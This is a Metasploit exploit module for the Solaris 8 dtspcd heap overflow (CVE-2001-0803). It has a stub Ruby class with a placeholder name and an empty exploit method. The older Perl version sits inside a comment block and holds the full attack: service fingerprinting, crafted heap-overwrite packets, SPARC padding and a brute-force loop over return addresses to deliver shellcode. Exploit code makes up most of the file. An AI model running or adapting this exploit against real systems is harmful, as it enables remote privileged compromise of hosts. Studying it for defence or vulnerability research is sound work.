require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris dtspcd Heap Overflow',
			'Description'    => %q{
				This is a port of noir's dtspcd exploit. This module should
				work against any vulnerable version of Solaris 8 (sparc).
				The original exploit code was published in the book
				Shellcoder's Handbook.
					
			},
			'Author'         => [ 'noir <noir@uberhax0r.net>', 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4503'],
					[ 'CVE', '2001-0803'],
					[ 'URL', 'http://www.cert.org/advisories/CA-2001-31.html'],
					[ 'URL', 'http://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip'],
					[ 'MIL', '61'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0d",
					'PrependEncoder' => "\xa4\x1c\x40\x11\xa4\x1c\x40\x11\xa4\x1c\x40\x11",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jul 10 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_dtspcd_noir;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'Solaris dtspcd Heap Overflow',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'noir <noir [at] uberhax0r.net>',
		'H D Moore <hdm [at] metasploit.com>'
	  ],
	
	'Arch'  => [ 'sparc' ],
	'OS'    => [ 'solaris' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The dtogin service port', 6112],
	  },

	'Payload' =>
	  {
		'Space'		=> 800,
		'BadChars'	=> "\x00\x0d",
		'PrependEncoder' => (pack('N', 0xa41c4011) x 3),
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This is a port of noir's dtspcd exploit. This module should work against
	any vulnerable version of Solaris 8 (sparc). The original exploit code
	was published in the book Shellcoder's Handbook.
}),

	'Refs'  =>
	  [
		['OSVDB', '4503'],
		['CVE', '2001-0803'],
		['URL', 'http://www.cert.org/advisories/CA-2001-31.html'],
		['URL', 'http://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip'],
		['MIL', '61'],
	  ],

	'Targets' =>
	  [
		['Solaris8', 0xff3b0000, 0x2c000, 0x2f000, 0x400, [ 0x321b4, 0x361d8, 0x361e0, 0x381e8 ] ],
	  ],

	'Keys'  => ['dtspcd'],

	'DisclosureDate' => 'Jul 10 2002',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	if(! $self->get_uname) {
		$self->PrintLine("[*] No response from the dtlogin service");
		return $self->CheckCode('Safe');
	}

	# XXX - probe service for crash
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[ $target_idx ];

	if(! $self->get_uname) {
		$self->PrintLine("[*] No response from the dtlogin service");
		return;
	}

	my ($res, $req);

	for my $tjmp ( @{ $target->[5] } ) {
		for (my $rbase  = $target->[2]; $rbase < $target->[3]; $rbase += $target->[4] ) {
			$self->PrintLine("[*] Trying ".sprintf("0x%.8x 0x%.8x", $target->[1] + $tjmp, $rbase));
			return if ! $self->attack($target->[1] + $tjmp, $rbase, $shellcode);
			return if ! $self->attack($target->[1] + $tjmp, $rbase + 4, $shellcode);
		}
	}
}

sub spc_setup {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->{'SOC'} = $s;
	return $s;
}

sub spc_register {
	my ($self, $user, $buff) = @_;
	return "4 "."\x00".$user."\x00\x00"."10"."\x00".$buff;
}

sub spc_write {
	my ($self, $buff, $cmd) = @_;
	my $req = sprintf("%08x%02x%04x%04x  %s", 2, $cmd, length($buff), ++$self->{'SEQ'}, $buff);
	return if ! $self->{'SOC'};
	return $self->{'SOC'}->Send($req);
}

sub spc_read {
	my $self = shift;
	return if ! $self->{'SOC'};
	my $buff = $self->{'SOC'}->Recv(20, 5);
	my $chan = hex(substr($buff, 0, 9));
	my $cmd  = hex(substr($buff, 9, 1));
	my $mbl  = hex(substr($buff, 10, 4));
	my $seq  = hex(substr($buff, 14, 4));
	$buff = $self->{'SOC'}->Recv($mbl, 5);
	return $buff;
}

sub get_uname {
	my $self = shift;
	return if ! $self->spc_setup;
	$self->spc_write($self->spc_register('root', "\x00"), 4);
	my $buff = $self->spc_read;
	$buff =~ s/\x00//g;

	my ($host, $os, $ver, $arch) = split(/:/, $buff);
	return if ! $host;

	$self->PrintLine("[*] Detected dtspcd running $os v$ver on $arch hardware");
	$self->spc_write("", 2);
}

sub get_chunk {
	my ($self, $retloc, $retadd) = @_;
	return
	  "\x12\x12\x12\x12" . pack('N', $retadd).
	  "\x23\x23\x23\x23\xff\xff\xff\xff".
	  "\x34\x34\x34\x34\x45\x45\x45\x45".
	  "\x56\x56\x56\x56" . pack('N', $retloc - 8);
}

sub attack {
	my ($self, $retloc, $retadd, $fcode) = @_;
	return if ! $self->spc_setup;

	my $req = "\xa4\x1c\x40\x11\x20\xbf\xff\xff" x ((4096 - 8 - length($fcode)) / 8);
	$req .= $fcode .
	  "\x00\x00\x10\x3e\x00\x00\x00\x14".
	  "\x12\x12\x12\x12\xff\xff\xff\xff".
	  "\x00\x00\x0f\xf4".
	  $self->get_chunk($retloc, $retadd);

	$req .= "A" x ((0x103e - 8) - length($req));

	$self->spc_write($self->spc_register("", $req), 4);
	my $res = $self->{'SOC'}->Recv(-1, 5);
	return 1;
}

1;

=end


end
end	
